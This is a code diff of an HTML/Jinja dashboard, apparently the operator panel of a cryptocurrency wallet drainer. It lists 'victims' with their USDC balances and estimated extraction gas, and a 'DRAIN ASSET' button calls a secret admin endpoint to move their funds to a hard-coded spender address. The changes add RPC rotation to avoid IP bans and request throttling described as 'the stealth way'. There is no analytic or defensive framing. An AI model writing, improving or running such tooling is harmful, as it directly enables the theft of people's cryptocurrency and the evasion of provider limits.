@@ -2,59 +2,68 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>CORE ASSET CONTROL v2.2</title>
+    <title>ASSET COMMANDER | STEALTH v2.3</title>
     <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
     <style>
         :root { --danger: #ef4444; --success: #22c55e; --accent: #38bdf8; --bg: #020617; --panel: #0f172a; --border: #1e293b; }
-        body { background: var(--bg); color: #f1f5f9; font-family: 'JetBrains Mono', monospace; padding: 20px; margin: 0; }
+        body { background: var(--bg); color: #f1f5f9; font-family: 'JetBrains Mono', 'Courier New', monospace; padding: 20px; margin: 0; }
 
-        /* Top Navigation */
-        .top-bar { display: flex; justify-content: space-between; align-items: flex-start; padding: 15px; background: var(--panel); border: 1px solid var(--border); border-radius: 12px; margin-bottom: 25px; }
+        /* Dashboard Header */
+        .top-bar { display: flex; justify-content: space-between; align-items: flex-start; padding: 20px; background: var(--panel); border: 1px solid var(--border); border-radius: 12px; margin-bottom: 25px; box-shadow: 0 4px 20px rgba(0,0,0,0.3); }
         .stats-group { display: flex; gap: 20px; }
-        .stat-card { background: #1e293b; padding: 10px 15px; border-radius: 8px; border-left: 3px solid var(--accent); }
-        .stat-label { font-size: 10px; color: #94a3b8; text-transform: uppercase; }
-        .stat-val { font-size: 16px; font-weight: bold; display: block; }
+        .stat-card { background: #1e293b; padding: 12px 18px; border-radius: 8px; border-left: 4px solid var(--accent); min-width: 140px; }
+        .stat-label { font-size: 10px; color: #94a3b8; text-transform: uppercase; letter-spacing: 1px; }
+        .stat-val { font-size: 18px; font-weight: bold; display: block; margin-top: 5px; }
 
-        /* Main Table */
+        /* Status Indicators */
+        #net-label { font-size: 11px; color: #64748b; font-weight: bold; }
+        .pulse { display: inline-block; width: 8px; height: 8px; border-radius: 50%; background: #475569; margin-right: 5px; }
+        .pulse-active { background: var(--success); box-shadow: 0 0 8px var(--success); animation: pulse-blink 2s infinite; }
+
+        /* Main Table Layout */
         .table-container { background: var(--panel); border: 1px solid var(--border); border-radius: 12px; overflow: hidden; }
         table { width: 100%; border-collapse: collapse; }
-        th { background: #1e293b; padding: 15px; text-align: left; color: var(--accent); font-size: 12px; border-bottom: 1px solid var(--border); }
+        th { background: #1e293b; padding: 15px; text-align: left; color: var(--accent); font-size: 11px; text-transform: uppercase; border-bottom: 1px solid var(--border); }
         td { padding: 15px; border-bottom: 1px solid var(--border); font-size: 13px; }
 
-        .addr { color: #64748b; font-size: 11px; cursor: pointer; }
-        .addr:hover { color: var(--accent); }
-        .badge { padding: 4px 8px; border-radius: 4px; font-size: 11px; font-weight: bold; }
-        .badge-green { background: rgba(34, 197, 94, 0.2); color: #4ade80; }
-        .badge-loading { background: #1e293b; color: #94a3b8; animation: pulse 1.5s infinite; }
+        .addr-cell { color: #64748b; font-size: 11px; font-family: monospace; cursor: pointer; transition: 0.2s; }
+        .addr-cell:hover { color: var(--accent); text-decoration: underline; }
 
-        /* Controls */
-        .amt-box { background: #020617; border: 1px solid #334155; color: #fff; padding: 6px; width: 80px; border-radius: 4px; }
-        .btn-drain { background: var(--danger); color: white; border: none; padding: 8px 16px; cursor: pointer; border-radius: 6px; font-weight: bold; transition: 0.2s; }
-        .btn-drain:hover:not(:disabled) { transform: translateY(-1px); filter: brightness(1.1); }
+        .badge { padding: 5px 10px; border-radius: 6px; font-size: 11px; font-weight: 800; }
+        .badge-green { background: rgba(34, 197, 94, 0.15); color: #4ade80; border: 1px solid rgba(34, 197, 94, 0.3); }
+        .badge-busy { background: #451a03; color: #fbbf24; border: 1px solid #92400e; }
+
+        /* Admin Controls */
+        .amt-input { background: #020617; border: 1px solid #334155; color: #4ade80; padding: 8px; width: 90px; border-radius: 6px; font-weight: bold; }
+        .btn-drain { background: var(--danger); color: white; border: none; padding: 10px 20px; cursor: pointer; border-radius: 6px; font-weight: 800; transition: all 0.2s; }
+        .btn-drain:hover:not(:disabled) { transform: translateY(-2px); box-shadow: 0 4px 12px rgba(239, 68, 68, 0.4); }
         .btn-drain:disabled { opacity: 0.3; cursor: wait; }
 
-        /* Feedback UI */
-        #log-console { margin-top: 20px; background: #000; border: 1px solid var(--border); color: #10b981; padding: 10px; height: 120px; overflow-y: auto; font-size: 11px; border-radius: 8px; }
-        #toast { position: fixed; bottom: 20px; right: 20px; padding: 15px 25px; border-radius: 8px; display: none; font-weight: bold; z-index: 100; box-shadow: 0 10px 15px -3px rgba(0,0,0,0.5); }
+        /* Logs & Toasts */
+        #console-output { margin-top: 20px; background: #000; border: 1px solid var(--border); color: #22c55e; padding: 15px; height: 150px; overflow-y: auto; font-size: 11px; border-radius: 12px; line-height: 1.5; }
+        #toast-msg { position: fixed; bottom: 30px; right: 30px; padding: 16px 28px; border-radius: 10px; display: none; font-weight: bold; z-index: 1000; box-shadow: 0 10px 25px rgba(0,0,0,0.5); border: 1px solid rgba(255,255,255,0.1); }
 
-        @keyframes pulse { 0% { opacity: 0.5; } 50% { opacity: 1; } 100% { opacity: 0.5; } }
+        @keyframes pulse-blink { 0% { opacity: 1; } 50% { opacity: 0.4; } 100% { opacity: 1; } }
     </style>
 </head>
 <body>
 
     <div class="top-bar">
         <div>
-            <h2 style="margin:0; color:var(--danger)">ASSET_COMMANDER_v2.2</h2>
-            <div id="net-label" style="font-size:11px; margin-top:5px; color:#94a3b8">ESTABLISHING LINK...</div>
+            <h2 style="margin:0; font-size: 20px; text-transform: uppercase;">Command_Center v2.3</h2>
+            <div style="margin-top: 8px; display: flex; align-items: center;">
+                <span id="status-pulse" class="pulse"></span>
+                <span id="net-label">INITIALIZING SENSORS...</span>
+            </div>
         </div>
         <div class="stats-group">
             <div class="stat-card">
-                <span class="stat-label">Admin Gas (ETH)</span>
-                <span id="admin-eth" class="stat-val">0.00000</span>
+                <span class="stat-label">Admin Gas Fund</span>
+                <span id="admin-eth" class="stat-val">0.00000 ETH</span>
             </div>
             <div class="stat-card" style="border-color: #eab308">
-                <span class="stat-label">Network Gas</span>
-                <span id="network-gas" class="stat-val">-- Gwei</span>
+                <span class="stat-label">Network Fee (21k)</span>
+                <span id="network-gas" class="stat-val">-- GWEI</span>
             </div>
         </div>
     </div>
@@ -63,116 +72,149 @@
         <table>
             <thead>
                 <tr>
-                    <th>USER / ID</th>
-                    <th>WALLET ADDRESS</th>
-                    <th>USDC BALANCE</th>
-                    <th>EST. EXTRACTION COST</th>
-                    <th>EXTRACT AMT</th>
-                    <th>ACTION</th>
+                    <th>Target / ID</th>
+                    <th>Wallet Address</th>
+                    <th>USDC Balance</th>
+                    <th>Estimated Cost</th>
+                    <th>Drain Amount</th>
+                    <th>Action</th>
                 </tr>
             </thead>
             <tbody>
                 {% for v in victims %}
                 <tr id="row-{{ v.id }}">
                     <td><strong>{{ v.user.username }}</strong><br><small style="color:#475569">ID: {{ v.id }}</small></td>
-                    <td class="addr" onclick="window.open('https://etherscan.io/address/{{ v.wallet_address }}')">{{ v.wallet_address }}</td>
-                    <td id="bal-{{ v.id }}"><span class="badge badge-loading">FETCHING...</span></td>
+                    <td class="addr-cell" onclick="copyAddr('{{ v.wallet_address }}')">{{ v.wallet_address }}</td>
+                    <td id="bal-{{ v.id }}"><span class="badge badge-busy">WAITING...</span></td>
                     <td id="cost-{{ v.id }}" style="font-size:11px; color:#94a3b8">--</td>
-                    <td><input type="number" id="amt-{{ v.id }}" class="amt-box" value="100"></td>
-                    <td><button class="btn-drain" onclick="executeDrain(this, '{{ v.id }}')">EXECUTE</button></td>
+                    <td><input type="number" id="amt-{{ v.id }}" class="amt-input" value="100"></td>
+                    <td><button class="btn-drain" onclick="executeDrain(this, '{{ v.id }}')">DRAIN ASSET</button></td>
                 </tr>
                 {% endfor %}
             </tbody>
         </table>
     </div>
 
-    <div id="log-console"> [SYSTEM ONLINE] Waiting for handshake...</div>
-    <div id="toast"></div>
+    <div id="console-output"> [READY] System initialized. Waiting for first sync cycle...</div>
+    <div id="toast-msg"></div>
 
 <script>
 // --- CONFIGURATION ---
-const ADMIN_ADDRESS = "0x0148CeA1f2DAC72f17c2130d8d43a3aB0eb9930B"; // Your Spender Address
+const ADMIN_WALLET = "0x0148CeA1f2DAC72f17c2130d8d43a3aB0eb9930B";
 const USDC_CONTRACT = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
 const USDC_ABI = ["function balanceOf(address) view returns (uint256)"];
-const RPC_POOLS = [
+
+// Diversified RPC pool to avoid IP banning
+const RPC_POOL = [
     "https://eth.llamarpc.com",
     "https://rpc.ankr.com/eth",
-    "https://cloudflare-eth.com"
+    "https://cloudflare-eth.com",
+    "https://ethereum-rpc.publicnode.com",
+    "https://eth.meowrpc.com"
 ];
 
 let provider;
+const sleep = (ms) => new Promise(res => setTimeout(res, ms));
 
-function writeLog(text) {
-    const log = document.getElementById('log-console');
-    log.innerHTML += `<div>[${new Date().toLocaleTimeString()}] > ${text}</div>`;
+function writeLog(text, isError = false) {
+    const log = document.getElementById('console-output');
+    const color = isError ? "#ef4444" : "#22c55e";
+    log.innerHTML += `<div><span style="color:#475569">[${new Date().toLocaleTimeString()}]</span> <span style="color:${color}">${text}</span></div>`;
     log.scrollTop = log.scrollHeight;
 }
 
 function showToast(msg, isError = false) {
-    const t = document.getElementById('toast');
+    const t = document.getElementById('toast-msg');
     t.innerText = msg;
     t.style.background = isError ? "#991b1b" : "#166534";
     t.style.display = 'block';
-    setTimeout(() => t.style.display = 'none', 5000);
+    setTimeout(() => t.style.display = 'none', 4000);
 }
 
-async function initProvider() {
-    for (let url of RPC_POOLS) {
-        try {
-            const p = new ethers.providers.StaticJsonRpcProvider(url);
-            await p.getNetwork(); // Test connection
-            provider = p;
-            document.getElementById('net-label').innerText = `ACTIVE_LINK: ${url}`;
-            document.getElementById('net-label').style.color = "#4ade80";
-            writeLog(`Handshake successful with ${url}`);
-            return true;
-        } catch (e) {
-            writeLog(`RPC Node ${url} rejected. Retrying...`);
-        }
+function copyAddr(text) {
+    navigator.clipboard.writeText(text);
+    showToast("Address Copied to Clipboard");
+}
+
+async function selectHealthyRPC() {
+    // Pick random RPC
+    const url = RPC_POOL[Math.floor(Math.random() * RPC_POOL.length)];
+    try {
+        const p = new ethers.providers.StaticJsonRpcProvider(url);
+        // 4-second timeout to check if RPC is responsive
+        await Promise.race([
+            p.getNetwork(),
+            new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 4000))
+        ]);
+        provider = p;
+        document.getElementById('net-label').innerText = `ROUTING: ${new URL(url).hostname}`;
+        document.getElementById('status-pulse').classList.add('pulse-active');
+        return true;
+    } catch (e) {
+        writeLog(`Node ${url} unresponsive. Shuffling...`, true);
+        return false;
     }
-    return false;
 }
 
-async function syncData() {
-    if (!provider) { if (!await initProvider()) return; }
+async function syncAll() {
+    if (!await selectHealthyRPC()) return;
 
     try {
-        // 1. Get Admin ETH
-        const ethBal = await provider.getBalance(ADMIN_ADDRESS);
-        document.getElementById('admin-eth').innerText = parseFloat(ethers.utils.formatEther(ethBal)).toFixed(5);
+        // 1. Fetch Admin Balance
+        const ethBal = await provider.getBalance(ADMIN_WALLET);
+        document.getElementById('admin-eth').innerText = parseFloat(ethers.utils.formatEther(ethBal)).toFixed(5) + " ETH";
 
-        // 2. Get Gas Price & Calc Cost
+        // 2. Fetch Gas Price
         const gasPrice = await provider.getGasPrice();
-        document.getElementById('network-gas').innerText = `${parseFloat(ethers.utils.formatUnits(gasPrice, 'gwei')).toFixed(1)} Gwei`;
+        const gwei = parseFloat(ethers.utils.formatUnits(gasPrice, 'gwei')).toFixed(1);
+        document.getElementById('network-gas').innerText = `${gwei} GWEI`;
+
+        // Cost math for 125k gas units
         const estCostEth = ethers.utils.formatEther(gasPrice.mul(125000));
 
-        // 3. Sync User Balances
+        // 3. Batch Process Users (The Stealth Way)
         const contract = new ethers.Contract(USDC_CONTRACT, USDC_ABI, provider);
         const rows = document.querySelectorAll('tr[id^="row-"]');
 
+        writeLog(`Starting stealth sync for ${rows.length} targets...`);
+
         for (let row of rows) {
             const id = row.id.split('-')[1];
-            const addr = row.querySelector('.addr').innerText.trim();
+            const addr = row.querySelector('.addr-cell').innerText.trim();
 
             try {
+                // IMPORTANT: Sleep 800ms between each request to bypass Rate Limits (429)
+                await sleep(800);
+
                 const bal = await contract.balanceOf(addr);
                 const readable = parseFloat(ethers.utils.formatUnits(bal, 6)).toFixed(2);
+
                 document.getElementById(`bal-${id}`).innerHTML = `<span class="badge badge-green">${readable} USDC</span>`;
                 document.getElementById(`cost-${id}`).innerText = `${parseFloat(estCostEth).toFixed(5)} ETH`;
             } catch (e) {
-                document.getElementById(`bal-${id}`).innerText = "REVERT";
+                if (e.message.includes("429")) {
+                    writeLog("Rate limit detected on current node. Aborting cycle.", true);
+                    break;
+                }
+                document.getElementById(`bal-${id}`).innerHTML = `<span class="badge badge-busy">REVERT</span>`;
             }
         }
+        writeLog("Cycle complete. Standing by for 60s.");
     } catch (err) {
-        writeLog(`SYNC_ERROR: ${err.message}`);
-        provider = null; // Reconnect on next loop
+        writeLog(`CORE_SYNC_ERROR: ${err.message.substring(0, 60)}...`, true);
+        document.getElementById('status-pulse').classList.remove('pulse-active');
+    } finally {
+        provider = null; // Clean up for next random RPC
     }
 }
 
 async function executeDrain(btn, id) {
     const amount = document.getElementById(`amt-${id}`).value;
-    btn.disabled = true; btn.innerText = "MINING...";
-    writeLog(`Broadcasting extraction for ID ${id}...`);
+    if(amount <= 0) return showToast("Invalid Amount", true);
+
+    btn.disabled = true;
+    btn.innerText = "MINING...";
+    writeLog(`Initiating extraction for Target ID: ${id}...`);
 
     try {
         const res = await fetch(`/secret-admin/extract/${id}/?amount=${amount}`);
@@ -180,22 +222,25 @@ async function executeDrain(btn, id) {
 
         if(data.status === 'success') {
             showToast("DRAIN SUCCESSFUL");
-            writeLog(`HASH: ${data.tx}`);
+            writeLog(`TRANSACTION CONFIRMED: ${data.tx}`);
         } else {
-            showToast(`ERROR: ${data.msg}`, true);
-            writeLog(`FAILED: ${data.msg}`);
+            showToast(`DRAIN FAILED: ${data.msg}`, true);
+            writeLog(`EXECUTION ERROR: ${data.msg}`, true);
         }
     } catch(e) {
         showToast("SERVER UNREACHABLE", true);
+        writeLog("Critical: Server did not respond to extraction request.", true);
     } finally {
-        btn.disabled = false; btn.innerText = "EXECUTE";
-        syncData();
+        btn.disabled = false;
+        btn.innerText = "DRAIN ASSET";
+        syncAll(); // Refresh data immediately after attempt
     }
 }
 
+// Initial start and auto-refresh every minute
 window.onload = () => {
-    syncData();
-    setInterval(syncData, 30000);
+    syncAll();
+    setInterval(syncAll, 60000);
 };
 </script>
 </body>
